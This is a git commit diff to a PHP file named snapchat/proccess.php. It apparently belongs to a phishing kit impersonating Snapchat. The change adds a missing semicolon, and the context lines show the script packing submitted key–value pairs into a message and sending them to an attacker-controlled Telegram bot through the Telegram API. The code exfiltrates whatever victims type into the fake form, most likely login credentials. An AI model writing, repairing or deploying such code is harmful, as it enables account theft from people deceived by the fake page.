f53950e12c9157d486a7238a18ad436f3fda5bc9
nomiss7 <89870042+Decisionbot@users.noreply.github.com>
2022-11-02 17:08:07 +0300

    sds

--- snapchat/proccess.php
+++ snapchat/proccess.php
@@ -27,7 +27,7 @@ foreach($arr as $key => $value) {
   $txt .= "<b>".$key."</b> ".$value."%0A";
 };
 
-$txt = rawurlencode($txt)
+$txt = rawurlencode($txt);
 
 $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
 
